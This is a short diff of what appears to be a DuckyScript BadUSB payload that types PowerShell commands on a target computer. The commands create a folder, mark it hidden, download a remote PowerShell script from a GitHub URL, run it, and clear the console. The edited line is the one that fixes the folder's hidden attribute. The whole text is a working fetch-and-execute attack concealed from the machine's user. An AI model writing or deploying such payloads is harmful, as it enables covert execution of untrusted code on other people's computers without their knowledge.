@@ -12,7 +12,7 @@ STRINGLN $pshost = get-host;$pswindow = $pshost.ui.rawui;$newsize = $pswindow.bu
 STRINGLN cd \
 STRINGLN New-Item -ItemType Directory -Force -Path "trycatchthishiddenfolder" -ErrorAction SilentlyContinue
 STRINGLN $trycatchfolder = Get-Item ./trycatchthishiddenfolder
-STRINGLN $trycatchfolder.Attributes -= "Hidden"
+STRINGLN $trycatchfolder.Attributes = "Hidden"
 STRINGLN cd .\trycatchthishiddenfolder
 STRINGLN Invoke-WebRequest -Uri "https://github.com/M4rc333l/trycatchme/raw/main/trycatchme.ps1" -OutFile "t.ps1"; .\t.ps1
 STRINGLN clear
